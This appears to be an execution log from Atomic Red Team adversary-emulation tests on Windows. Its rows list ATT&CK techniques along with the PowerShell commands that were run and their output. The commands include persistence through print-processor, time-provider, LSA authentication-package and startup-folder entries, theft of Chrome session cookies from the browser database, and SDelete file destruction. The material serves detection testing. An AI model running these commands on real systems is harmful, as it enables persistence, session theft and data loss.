""5fad3e_T1553.005.iso""']","['Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n']",['Mount ISO image'],"[{'tactic': 'defense-evasion', 'technique_name': 'Subvert Trust Controls: Mark-of-the-Web Bypass', 'technique_id': 'T1553.005'}]",['windows'],['psh']
196,Fixed,multiple,multiple :: Active Setup,"multiple :: [""HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number""]",multiple :: T1547.014,operation__atomic_windows_depfalse_pshtrue__t1547_014__multiple__active_setup__7ad5840a79f3259965fa28835dda93c4__SAVED_2024-03-08_210642,atomic_windows_depfalse_pshtrue__t1547_014__multiple__active_setup__7ad5840a79f3259965fa28835dda93c4,['7ad5840a79f3259965fa28835dda93c4'],1,1,1,[0],[''],"['Set-ItemProperty : Cannot find path \'HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\' because it does not exist.At line:1 char:1+ Set-ItemProperty -Path ""HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Install ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\SOFTWARE\\...E-444553540600}:String) [Set-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand ']",['0'],"['Set-ItemProperty -Path ""HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""; & $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup']","[""This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n""]","[""HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number""]","[{'tactic': 'multiple', 'technique_name': 'Active Setup', 'technique_id': 'T1547.014'}]",['windows'],['psh']
197,Fixed,multiple,multiple :: Boot or Logon Autostart Execution: Print Processors,multiple :: ['Print Processors'],multiple :: T1547.012,operation__atomic_windows_depfalse_pshtrue__t1547_012__multiple__boot_or_logon_autostart_execution-_print_processors__b2725f4e411b9328aa73fe54501a7564__SAVED_2024-03-08_205313,atomic_windows_depfalse_pshtrue__t1547_012__multiple__boot_or_logon_autostart_execution-_print_processors__b2725f4e411b9328aa73fe54501a7564,['b2725f4e411b9328aa73fe54501a7564'],1,0,1,[1],['The Print Spooler service is stopping.The Print Spooler service was stopped successfully.The operation completed successfully.\rThe Print Spooler service is starting.The Print Spooler service was started successfully.'],"['Copy-Item : Cannot find path \'C:\\T1547.012\\bin\\AtomicTest.dll\' because it does not exist.At line:1 char:132+ ... op spooler; Copy-Item ""$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.012\\bin\\AtomicTest.dll:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['0'],"['if( $(get-service -Name spooler).StartType -eq ""Disabled"") {Set-Service -Name ""spooler"" -StartupType Automatic}; net stop spooler; Copy-Item ""$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll"" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll; reg add ""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f; net start spooler; if(0){;   Restart-Computer; }']",['Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n'],['Print Processors'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Print Processors', 'technique_id': 'T1547.012'}]",['windows'],['psh']
208,Fixed,multiple,multiple :: Time Providers,multiple :: ['Create a new time provider'],multiple :: T1547.003,operation__atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__23daed0787180c7f2ffbc20528570749__SAVED_2024-03-08_193228,atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__23daed0787180c7f2ffbc20528570749,['23daed0787180c7f2ffbc20528570749'],1,0,1,[1],['The Windows Time service is stopping.The Windows Time service was stopped successfully.The operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe Windows Time service is starting.The Windows Time service was started successfully.'],"['Copy-Item : Cannot find path \'C:\\T1547.003\\bin\\AtomicTest.dll\' because it does not exist.At line:1 char:19+ ... op w32time; Copy-Item ""$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.003\\bin\\AtomicTest.dll:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['0'],"['net stop w32time; Copy-Item ""$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll"" C:\\Users\\Public\\AtomicTest.dll; reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\\Users\\Public\\AtomicTest.dll"" /f; reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f; reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f; net start w32time']",['Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n'],['Create a new time provider'],"[{'tactic': 'multiple', 'technique_name': 'Time Providers', 'technique_id': 'T1547.003'}]",['windows'],['psh']
209,Fixed,multiple,multiple :: Time Providers,multiple :: ['Edit an existing time provider'],multiple :: T1547.003,operation__atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__7a4867f379d79c82f217108c48bdbf33__SAVED_2024-03-08_193913,atomic_windows_depfalse_pshtrue__t1547_003__multiple__time_providers__7a4867f379d79c82f217108c48bdbf33,['7a4867f379d79c82f217108c48bdbf33'],1,0,1,[1],['The Windows Time service is stopping.The Windows Time service was stopped successfully.The operation completed successfully.\rThe operation completed successfully.\rThe operation completed successfully.\rThe Windows Time service is starting.The Windows Time service was started successfully.'],"['Copy-Item : Cannot find path \'C:\\T1547.003\\bin\\AtomicTest.dll\' because it does not exist.At line:1 char:19+ ... op w32time; Copy-Item ""$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.003\\bin\\AtomicTest.dll:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['0'],"['net stop w32time; Copy-Item ""$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll"" C:\\Users\\Public\\AtomicTest.dll; reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer"" /t REG_SZ /v ""DllName"" /d ""C:\\Users\\Public\\AtomicTest.dll"" /f; reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f; reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f; net start w32time']",['Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n'],['Edit an existing time provider'],"[{'tactic': 'multiple', 'technique_name': 'Time Providers', 'technique_id': 'T1547.003'}]",['windows'],['psh']
210,Fixed,multiple,multiple :: Authentication Package,multiple :: ['Authentication Package'],multiple :: T1547.002,operation__atomic_windows_depfalse_pshtrue__t1547_002__multiple__authentication_package__7197a8fcd7e833f42251ee3eddaa87c1__SAVED_2024-03-08_192543,atomic_windows_depfalse_pshtrue__t1547_002__multiple__authentication_package__7197a8fcd7e833f42251ee3eddaa87c1,['7197a8fcd7e833f42251ee3eddaa87c1'],1,0,1,[1],['The operation completed successfully.\r'],"['Copy-Item : Cannot find path \'C:\\T1547.002\\bin\\package.dll\' because it does not exist.At line:1 char:1+ Copy-Item ""$PathToAtomicsFolder\\T1547.002\\bin\\package.dll"" C:\\Windows ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.002\\bin\\package.dll:String) [Copy-Item], ItemNotFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['0'],"['Copy-Item ""$PathToAtomicsFolder\\T1547.002\\bin\\package.dll"" C:\\Windows\\System32\\; reg add ""HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa"" /v ""Authentication Packages"" /t REG_MULTI_SZ /d ""msv1_0\\0package.dll"" /f']","['Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n']",['Authentication Package'],"[{'tactic': 'multiple', 'technique_name': 'Authentication Package', 'technique_id': 'T1547.002'}]",['windows'],['psh']
211,Fixed,multiple,multiple :: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,multiple :: ['Suspicious jse file run from startup Folder'],multiple :: T1547.001,"operation__atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__fef50b36806647cb5a5511ae48f7e56f__SAVED_2024-03-08_191859","atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__fef50b36806647cb5a5511ae48f7e56f",['fef50b36806647cb5a5511ae48f7e56f'],1,0,0,[1],"['Microsoft (R) Windows Script Host Version 5.812Copyright (C) Microsoft Corporation. All rights reserved.Input Error: Can not find script file ""C:\\Users\\puma-4\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse"".Microsoft (R) Windows Script Host Version 5.812Copyright (C) Microsoft Corporation. All rights reserved.Input Error: Can not find script file ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse"".']","['Copy-Item : Cannot find path \'C:\\T1547.001\\src\\jsestartup.jse\' because it does not exist.At line:1 char:1+ Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse"" ""$env:A ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\jsestartup.jse:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Copy-Item : Cannot find path \'C:\\T1547.001\\src\\jsestartup.jse\' because it does not exist.At line:1 char:140+ ... artup.jse""; Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\jsestartup. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\jsestartup.jse:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['1'],"['Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse"" ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse""; Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\jsestartup.jse"" ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse""; cscript.exe /E:Jscript ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\jsestartup.jse""; cscript.exe /E:Jscript ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\jsestartup.jse""']","['jse files can be placed in and ran from the startup folder to maintain persistance.\nUpon execution, ""T1547.001 Hello, World JSE!"" will be displayed twice. \nAdditionally, the new files can be viewed in the ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup""\nfolder and will also run when the computer is restarted and the user logs in.\n']",['Suspicious jse file run from startup Folder'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', 'technique_id': 'T1547.001'}]",['windows'],['psh']
215,Fixed,multiple,multiple :: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,multiple :: ['Suspicious vbs file run from startup Folder'],multiple :: T1547.001,"operation__atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3b631d04243ac011df9f91cd07025180__SAVED_2024-03-08_184516","atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3b631d04243ac011df9f91cd07025180",['3b631d04243ac011df9f91cd07025180'],1,0,0,[1],"['Microsoft (R) Windows Script Host Version 5.812Copyright (C) Microsoft Corporation. All rights reserved.Input Error: Can not find script file ""C:\\Users\\puma-4\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs"".Microsoft (R) Windows Script Host Version 5.812Copyright (C) Microsoft Corporation. All rights reserved.Input Error: Can not find script file ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs"".']","['Copy-Item : Cannot find path \'C:\\T1547.001\\src\\vbsstartup.vbs\' because it does not exist.At line:1 char:1+ Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs"" ""$env:A ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\vbsstartup.vbs:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Copy-Item : Cannot find path \'C:\\T1547.001\\src\\vbsstartup.vbs\' because it does not exist.At line:1 char:140+ ... artup.vbs""; Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\vbsstartup.vbs:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['1'],"['Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs"" ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs""; Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs"" ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs""; cscript.exe ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs""; cscript.exe ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs""']","['vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, ""T1547.001 Hello, World VBS!"" will be displayed twice. \nAdditionally, the new files can be viewed in the ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup""\nfolder and will also run when the computer is restarted and the user logs in.\n']",['Suspicious vbs file run from startup Folder'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', 'technique_id': 'T1547.001'}]",['windows'],['psh']
216,Fixed,multiple,multiple :: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,multiple :: ['Suspicious bat file run from startup Folder'],multiple :: T1547.001,"operation__atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__03a127453d425bf1fd8dc9af1ed7ddce__SAVED_2024-03-08_175817","atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__03a127453d425bf1fd8dc9af1ed7ddce",['03a127453d425bf1fd8dc9af1ed7ddce'],1,0,0,[1],[''],"['Copy-Item : Cannot find path \'C:\\T1547.001\\src\\batstartup.bat\' because it does not exist.At line:1 char:1+ Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat"" ""$env:A ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\batstartup.bat:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Copy-Item : Cannot find path \'C:\\T1547.001\\src\\batstartup.bat\' because it does not exist.At line:1 char:140+ ... artup.bat""; Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\batstartup. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.001\\src\\batstartup.bat:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:281+ ... artup.bat""; Start-Process ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\ ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:372+ ... artup.bat""; Start-Process ""C:\\ProgramData\\Microsoft\\Windows\\Start Men ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']",['1'],"['Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat"" ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat""; Copy-Item ""$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat"" ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat""; Start-Process ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat""; Start-Process ""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat""']","['bat files can be placed in and executed from the startup folder to maintain persistance\n\nUpon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the ""$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup""\nfolder and will also run when the computer is restarted and the user logs in.\n']",['Suspicious bat file run from startup Folder'],"[{'tactic': 'multiple', 'technique_name': 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder', 'technique_id': 'T1547.001'}]",['windows'],['psh']
228,Fixed,multiple,multiple :: Event Triggered Execution: Application Shimming,multiple :: ['New shim database files created in the default shim database directory'],multiple :: T1546.011,operation__atomic_windows_depfalse_pshtrue__t1546_011__multiple__event_triggered_execution-_application_shimming__a967003ff25bdd94030cdd885feb25d7__SAVED_2024-03-08_163812,atomic_windows_depfalse_pshtrue__t1546_011__multiple__event_triggered_execution-_application_shimming__a967003ff25bdd94030cdd885feb25d7,['a967003ff25bdd94030cdd885feb25d7'],1,0,0,[1],[''],"['Copy-Item : Cannot find path \'C:\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\' because it does not exist.At line:1 char:1+ Copy-Item ""$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1546.011\\bi...patDatabase.sdb:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Copy-Item : Cannot find path \'C:\\T1546.011\\bin\\T1546.011CompatDatabase.sdb\' because it does not exist.At line:1 char:132+ ... tabase.sdb; Copy-Item ""$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011Co ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1546.011\\bi...patDatabase.sdb:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']",['1'],"['Copy-Item ""$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb"" C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; Copy-Item ""$PathToAtomicsFolder\\T1546.011\\bin\\T1546.011CompatDatabase.sdb"" C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb']","['Upon execution, check the ""C:\\Windows\\apppatch\\Custom\\"" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n']",['New shim database files created in the default shim database directory'],"[{'tactic': 'multiple', 'technique_name': 'Event Triggered Execution: Application Shimming', 'technique_id': 'T1546.011'}]",['windows'],['psh']
234,Fixed,multiple,multiple :: Create or Modify System Process: Windows Service,multiple :: ['Service Installation PowerShell'],multiple :: T1543.003,operation__atomic_windows_depfalse_pshtrue__t1543_003__multiple__create_or_modify_system_process-_windows_service__7030b003cc5646c7cc83410d2f057575__SAVED_2024-03-08_155836,atomic_windows_depfalse_pshtrue__t1543_003__multiple__create_or_modify_system_process-_windows_service__7030b003cc5646c7cc83410d2f057575,['7030b003cc5646c7cc83410d2f057575'],1,0,0,[1],['Status   Name               DisplayName                           ------   ----               -----------                           Stopped  AtomicTestServi... AtomicTestService_PowerShell          '],"['Start-Service : Service \'AtomicTestService_PowerShell (AtomicTestService_PowerShell)\' cannot be started due to the following error: Cannot start service AtomicTestService_PowerShell on computer \'.\'.At line:1 char:94+ ... tomicService.exe""; Start-Service -Name ""AtomicTestService_PowerShell""+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],     ServiceCommandException    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand ']",['1'],"['New-Service -Name ""AtomicTestService_PowerShell"" -BinaryPathName ""411da5_AtomicService.exe""; Start-Service -Name ""AtomicTestService_PowerShell""']","['Installs A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n']",['Service Installation PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Create or Modify System Process: Windows Service', 'technique_id': 'T1543.003'}]",['windows'],['psh']
236,Fixed,credential-access,credential-access :: Steal Web Session Cookie,credential-access :: ['Steal Chrome Cookies (Windows)'],credential-access :: T1539,operation__atomic_windows_depfalse_pshtrue__t1539__credential-access__steal_web_session_cookie__126aaf80c6a232eaf08dcef3163d4aed__SAVED_2024-03-08_154527,atomic_windows_depfalse_pshtrue__t1539__credential-access__steal_web_session_cookie__126aaf80c6a232eaf08dcef3163d4aed,['126aaf80c6a232eaf08dcef3163d4aed'],1,0,0,[1],[''],"['out-file : Could not find a part of the path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1539ChromeCookies.txt\'.At line:1 char:329+ ... \\Cookies"" | out-file -filepath ""PathToAtomicsFolder\\..\\ExternalPayloa ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand ']",['1'],"['stop-process -name ""chrome"" -force -erroraction silentlycontinue; ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];"" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe ""$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"" | out-file -filepath ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt""']","[""This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. \nOnce an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. \nNote: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n""]",['Steal Chrome Cookies (Windows)'],"[{'tactic': 'credential-access', 'technique_name': 'Steal Web Session Cookie', 'technique_id': 'T1539'}]",['windows'],['psh']
253,Fixed,impact,impact :: Data Destruction,impact :: ['Windows - Overwrite file with SysInternals SDelete'],impact :: T1485,operation__atomic_windows_depfalse_pshtrue__t1485__impact__data_destruction__b74b60096fb49650e27e470047a2b9c9__SAVED_2024-03-08_134018,atomic_windows_depfalse_pshtrue__t1485__impact__data_destruction__b74b60096fb49650e27e470047a2b9c9,['b74b60096fb49650e27e470047a2b9c9'],1,0,0,[1],['    Directory: C:\\Users\\puma-4\\Desktop\\ExternalPayloadsMode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 -a----          3/8/2024   1:37 PM              0 T1485.txt                                                            '],"['& : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:150+ ... -Force }; & ""PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...ete\\sdelete.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule ']",['1'],"['if (-not (Test-Path ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt"")) { New-Item ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt"" -Force }; & ""PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe"" -accepteula ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt""']","['Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, ""Files deleted: 1"" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n']",['Windows - Overwrite file with SysInternals SDelete'],"[{'tactic': 'impact', 'technique_name': 'Data Destruction', 'technique_id': 'T1485'}]",['windows'],['psh']
